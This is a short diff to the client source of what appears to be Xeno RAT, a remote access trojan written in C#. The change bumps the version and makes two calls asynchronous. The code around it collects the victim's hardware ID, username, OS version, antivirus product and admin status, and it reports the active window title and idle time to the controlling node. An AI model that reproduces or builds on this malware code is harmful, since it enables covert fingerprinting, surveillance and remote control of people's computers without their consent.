@@ -58,7 +58,7 @@ namespace xeno_rat_client
                 return;
             }
             //get hwid, username etc. seperated by null
-            string clientversion = "1.8.5";//find a way to get the client version.
+            string clientversion = "1.8.7";//find a way to get the client version.
             string[] info = new string[] { Utils.HWID(), Environment.UserName, WindowsIdentity.GetCurrent().Name, clientversion, Utils.GetWindowsVersion(), Utils.GetAntivirus(), Utils.IsAdmin().ToString() };
             byte[] data = new byte[0];
             byte[] nullbyte = new byte[] { 0 };
@@ -196,8 +196,8 @@ namespace xeno_rat_client
 
         public async Task SendUpdateInfo(Node node) 
         {
-            string currwin = Utils.GetCaptionOfActiveWindow();
-            string idleTime = (Utils.GetIdleTime()/1000).ToString();
+            string currwin = await Utils.GetCaptionOfActiveWindowAsync();
+            string idleTime = ((await Utils.GetIdleTimeAsync()) /1000).ToString();
             string update_data = currwin + "\n" + idleTime;
             byte[] data=Encoding.UTF8.GetBytes(update_data);
             await node.SendAsync(data);
